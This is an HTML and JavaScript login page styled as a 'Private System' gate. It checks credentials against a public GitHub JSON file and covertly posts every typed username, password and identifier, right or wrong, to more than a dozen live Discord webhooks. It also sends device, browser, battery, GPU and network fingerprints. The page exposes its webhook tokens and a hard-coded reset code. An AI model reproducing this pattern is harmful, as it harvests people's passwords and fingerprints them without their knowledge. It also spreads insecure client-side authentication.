<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Private System</title>
<style>
  * {
    box-sizing: border-box;
    font-family: 'Segoe UI', sans-serif;
  }
  body {
    margin: 0; padding: 0;
    background: #000;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  .box {
    background: #000;
    border-radius: 20px;
    border: 3px solid white;
    box-shadow: 0 0 15px white;
    width: 360px;
    padding: 30px 25px;
    text-align: center;
    position: relative;
    transition: border-color 0.3s, box-shadow 0.3s;
  }
  .box.flashing {
    animation: flashRed 0.4s ease-in-out 2;
  }
  @keyframes flashRed {
    0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
    50% { border-color: white; box-shadow: 0 0 5px white; }
  }
  h2 {
    font-size: 1.7em;
    margin-bottom: 20px;
    font-family: 'Courier New', monospace;
  }
  input {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    background: #1c1c1c;
    border: none;
    color: white;
    border-radius: 8px;
    font-size: 1em;
  }
  label {
    display: flex;
    align-items: center;
    font-size: 0.9em;
    margin-bottom: 10px;
    gap: 10px;
    cursor: pointer;
  }
  #showPassword:checked + span {
    color: red;
  }
  button {
    width: 100%;
    padding: 12px;
    background-color: red;
    color: white;
    font-size: 1em;
    border: none;
    border-radius: 8px;
    cursor: pointer;
  }
  .attempt-counter, .error-message {
    margin-top: 10px;
    font-size: 0.85em;
    color: red;
  }
  .popup {
    display: none;
    position: absolute;
    top: 50%;
    left: 50%;
    width: 320px;
    padding: 20px;
    transform: translate(-50%, -50%);
    background: black;
    border: 3px solid white;
    border-radius: 15px;
    box-shadow: 0 0 20px white;
    z-index: 10;
  }
  .popup input {
    margin-bottom: 15px;
  }
</style>
</head>
<body>
  <div class="box" id="loginBox">
    <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

<script>
(() => {
  const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

  // Webhooks for the new logging systems
  const loggingWebhooks = {
    username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
    password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
    identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
    invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
    invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
    invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
    attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
    attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
  };

  // Original webhooks
  const webhookUrls = {
    userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
    browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
    deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
    connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
    sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
  };

  const loginBox = document.getElementById('loginBox');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const userIDInput = document.getElementById('userID');
  const showPasswordCheckbox = document.getElementById('showPassword');
  const submitBtn = document.getElementById('submitBtn');
  const errorMsg = document.getElementById('errorMsg');
  const attemptsText = document.getElementById('attemptsText');
  const resetPopup = document.getElementById('resetPopup');
  const resetField = document.getElementById('resetField');
  const resetBtn = document.getElementById('resetBtn');

  let attempts = 5;
  let users = [];
  let loginTime = null;

  // Show/hide password toggle
  showPasswordCheckbox.addEventListener('change', () => {
    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
  });

  // Fetch user JSON data on load
  fetch(USER_JSON_URL)
    .then(res => res.json())
    .then(data => {
      users = data;
    })
    .catch(() => {
      users = [];
      console.error('Failed to load user JSON data.');
    });

  // Flash red outline function
  function flashRedOutline(times = 2, delay = 400) {
    let count = 0;
    function flash() {
      loginBox.classList.add('flashing');
      setTimeout(() => {
        loginBox.classList.remove('flashing');
        count++;
        if (count < times) setTimeout(flash, delay);
      }, delay);
    }
    flash();
  }

  // Get WebGL Renderer (used for device logging)
  function getWebGLRenderer() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "Unavailable";
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
    } catch {
      return "Unavailable";
    }
  }

  // Battery status promise (device logging)
  async function getBatteryStatus() {
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        return battery;
      } catch {
        return null;
      }
    }
    return null;
  }

  // Build user info object from user JSON
  function findUser(username, userID) {
    return users.find(u =>
      u.username?.toLowerCase() === username.toLowerCase() &&
      u.userID?.toString() === userID.toString()
    );
  }

  // Send Discord webhook with custom embed fields
  async function sendWebhook(url, embed) {
    try {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] }),
      });
    } catch (e) {
      console.warn('Webhook send failed:', e);
    }
  }

  // Collect browser & device info for logs
  async function collectLoggingData(user, password) {
    const now = new Date();
    loginTime = now.toISOString();
    const batteryStatus = await getBatteryStatus();

    return {
      user,
      password,
      loginTime,
      batteryStatus,
      webglRenderer: getWebGLRenderer(),
    };
  }

  // New logging functions for the specific systems
  async function logUsername(name, username) {
    const embed = {
      title: "Username Logging",
      color: 0x3498db,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Username", value: username, inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.username, embed);
  }

  async function logPassword(name, password) {
    const embed = {
      title: "Password Logging",
      color: 0xe74c3c,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Password", value: password, inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.password, embed);
  }

  async function logIdentifier(name, identifier) {
    const embed = {
      title: "Identifier Logging",
      color: 0x2ecc71,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Identifier", value: identifier, inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.identifier, embed);
  }

  async function logInvalidUsername(name, username) {
    const embed = {
      title: "Invalid Username Logging",
      color: 0xf39c12,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Invalid Username", value: username, inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.invalid_username, embed);
  }

  async function logInvalidPassword(name, password) {
    const embed = {
      title: "Invalid Password Logging",
      color: 0xe67e22,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Invalid Password", value: password, inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.invalid_password, embed);
  }

  async function logInvalidIdentifier(name, identifier) {
    const embed = {
      title: "Invalid Identifier Logging",
      color: 0xd35400,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Invalid Identifier", value: identifier, inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.invalid_identifier, embed);
  }

  async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
    const embed = {
      title: "Attempts Counter Logging",
      color: 0x9b59b6,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Username", value: username, inline: true },
        { name: "Password", value: password, inline: true },
        { name: "Identifier", value: identifier, inline: true },
        { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.attempts_counter, embed);
  }

  async function logAttemptsExceeded(name, username, password, identifier) {
    const embed = {
      title: "Attempts Exceeded Logging",
      color: 0xc0392b,
      fields: [
        { name: "Name", value: name || "N/A", inline: true },
        { name: "Username", value: username, inline: true },
        { name: "Password", value: password, inline: true },
        { name: "Identifier", value: identifier, inline: true },
        { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
        { name: "Date/Time", value: new Date().toISOString(), inline: false }
      ]
    };
    await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
  }

  // Original embed builders (unchanged)
  function buildUserLoggingEmbed(data) {
    return {
      title: "User Logging System",
      color: 0xff0000,
      fields: [
        { name: "Name", value: data.user.name || "N/A", inline: true },
        { name: "Username", value: data.user.username, inline: true },
        { name: "Password", value: data.password, inline: true },
        { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
        { name: "Role Type", value: data.user.role || "N/A", inline: true },
        { name: "Login Time", value: data.loginTime, inline: false },
        { name: "User Identifier", value: data.user.userID.toString(), inline: true },
        { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
      ]
    };
  }

  function buildBrowserLoggingEmbed(data) {
    const nav = navigator;
    return {
      title: "Browser Logging System",
      color: 0x00ff00,
      fields: [
        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
        { name: "Username", value: data.user.username || "N/A", inline: true },
        { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
        { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
        { name: "Browser Language", value: nav.language || "Unknown", inline: true },
        { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
        { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
        { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
        { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
        { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
        { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
        { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
        { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
        { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
        { name: "Font Smoothing Type", value: "Unavailable", inline: true },
        { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
        { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
        { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
      ]
    };
  }

  function buildDeviceLoggingEmbed(data) {
    const nav = navigator;
    const battery = data.batteryStatus;
    return {
      title: "Device Logging System",
      color: 0x0000ff,
      fields: [
        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
        { name: "Username", value: data.user.username || "N/A", inline: true },
        { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
        { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
        { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
        { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
        { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
        { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
        { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
        { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
        { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
        { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
        { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
        { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
        { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
        { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
        { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
        { name: "Language", value: nav.language || "Unknown", inline: true }
      ]
    };
  }

  function buildConnectionLoggingEmbed(data) {
    const nav = navigator;
    return {
      title: "Connection Logging System",
      color: 0xffff00,
      fields: [
        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
        { name: "Username", value: data.user.username || "N/A", inline: true },
        { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

        { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
        { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
        { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

        { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
        { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
        { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

        { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
        { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
        { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

        { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
        { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
        { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

        { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
        { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
        { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
      ]
    };
  }

  function buildSessionLoggingEmbed(data) {
    return {
      title: "Session Logging System",
      color: 0x00ffff,
      fields: [
        { name: "Person's Name", value: data.user.name || "N/A", inline: true },
        { name: "Username", value: data.user.username || "N/A", inline: true },
        { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

        { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
        { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
        { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

        { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
        { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

        { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
        { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

        { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
        { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

        { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
        { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
        { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

        { name: "Idle Time", value: data.idleTime || "0s", inline: true },
        { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
        { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
      ]
    };
  }

  // Handle login submission
  async function submitLogin() {
    errorMsg.textContent = '';
    if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
      errorMsg.textContent = 'Please fill all fields.';
      return;
    }

    const username = usernameInput.value;
    const password = passwordInput.value;
    const userID = userIDInput.value;
    const user = findUser(username, userID);

    // Log the attempt
    await logAttemptsCounter(
      user?.name || "Unknown",
      username,
      password,
      userID,
      attempts
    );

    if (!user) {
      await logInvalidUsername(user?.name || "Unknown", username);
      await logInvalidIdentifier(user?.name || "Unknown", userID);
      handleFailedAttempt('User not found.');
      return;
    }

    if (password !== user.password) {
      await logInvalidPassword(user.name, password);
      handleFailedAttempt('Incorrect password.');
      return;
    }

    // Correct login
    attempts = 5;
    updateAttemptsText();
    errorMsg.textContent = '';
    resetPopup.style.display = 'none';
    loginBox.style.borderColor = 'white';
    loginBox.style.boxShadow = '0 0 15px white';

    // Log successful credentials
    await logUsername(user.name, username);
    await logPassword(user.name, password);
    await logIdentifier(user.name, userID);

    // Collect data and send logs
    const loggingData = await collectLoggingData(user, password);

    // Send all 5 webhooks:
    await Promise.all([
      sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
      sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
      sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
      sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
      sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
    ]);

    alert(`Welcome ${user.name || user.username}! Login successful.`);
    // Optionally clear fields
    usernameInput.value = '';
    passwordInput.value = '';
    userIDInput.value = '';
  }

  // Failed attempt handler
  async function handleFailedAttempt(msg) {
    attempts--;
    updateAttemptsText();
    errorMsg.textContent = msg;
    
    if (attempts <= 0) {
      attempts = 0;
      errorMsg.textContent = 'No attempts left. Please reset.';
      
      // Log attempts exceeded
      const username = usernameInput.value;
      const password = passwordInput.value;
      const userID = userIDInput.value;
      const user = findUser(username, userID);
      
      await logAttemptsExceeded(
        user?.name || "Unknown",
        username,
        password,
        userID
      );
      
      showResetPopup();
      disableInputs();
    } else {
      if (attempts <= 3) {
        flashRedOutline(2, 400);
      }
    }
  }

  // Update attempts display
  function updateAttemptsText() {
    attemptsText.textContent = `Attempts Left: ${attempts}`;
  }

  // Disable inputs and submit button
  function disableInputs() {
    usernameInput.disabled = true;
    passwordInput.disabled = true;
    userIDInput.disabled = true;
    submitBtn.disabled = true;
  }

  // Enable inputs and submit button
  function enableInputs() {
    usernameInput.disabled = false;
    passwordInput.disabled = false;
    userIDInput.disabled = false;
    submitBtn.disabled = false;
  }

  // Show reset popup
  function showResetPopup() {
    resetPopup.style.display = 'block';
    resetPopup.setAttribute('aria-hidden', 'false');
    resetField.focus();
  }

  // Hide reset popup
  function hideResetPopup() {
    resetPopup.style.display = 'none';
    resetPopup.setAttribute('aria-hidden', 'true');
    resetField.value = '';
  }

  async function resetCounter() {
    const enteredCode = resetField.value.trim();
    const isCorrect = enteredCode === 'Reset.Counter.2579';

    const username = usernameInput.value || 'Unknown';
    const password = passwordInput.value || 'Unknown';
    const userID = userIDInput.value || 'Unknown';
    const user = findUser(username, userID) || {};

    // 1. Send "Reset box Detected" webhook immediately
    const resetBoxEmbed = {
      title: "üîî Reset Box Detected",
      color: 0xffff00,
      fields: [
        { name: "Name", value: user.name || "N/A", inline: true },
        { name: "Username", value: username, inline: true },
        { name: "Password Entered", value: password, inline: true },
        { name: "User ID", value: userID, inline: true },
        { name: "Entered Code", value: enteredCode, inline: false },
        { name: "Time", value: new Date().toLocaleString(), inline: false }
      ]
    };
    const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
    await sendWebhook(resetBoxWebhook, resetBoxEmbed);

    // Build embed for correct or incorrect code
    const resultEmbed = {
      title: isCorrect ? "‚úÖ Reset Code Accepted" : "‚ùå Incorrect Reset Code Attempt",
      color: isCorrect ? 0x00ff00 : 0xff0000,
      fields: [
        { name: "Name", value: user.name || "N/A", inline: true },
        { name: "Username", value: username, inline: true },
        { name: "Password Entered", value: password, inline: true },
        { name: "User ID", value: userID, inline: true },
        { name: "Reset Code", value: enteredCode, inline: false },
        { name: "Time", value: new Date().toLocaleString(), inline: false }
      ]
    };

    // Select webhook for correct or incorrect logging
    const resultWebhook = isCorrect
      ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
      : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

    await sendWebhook(resultWebhook, resultEmbed);

    if (isCorrect) {
      attempts = 5;
      updateAttemptsText();
      enableInputs();
      hideResetPopup();
      errorMsg.textContent = '';
    } else {
      alert('Incorrect reset code.');
    }
  }

  // Attach event listeners
  submitBtn.addEventListener('click', submitLogin);
  resetBtn.addEventListener('click', resetCounter);

  // Enter key submits login if popup hidden, else tries reset
  document.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      if (resetPopup.style.display === 'block') {
        resetCounter();
      } else {
        submitLogin();
      }
    }
  });

  // Initialize attempts display
  updateAttemptsText();
})();
</script>
</body>
</html>
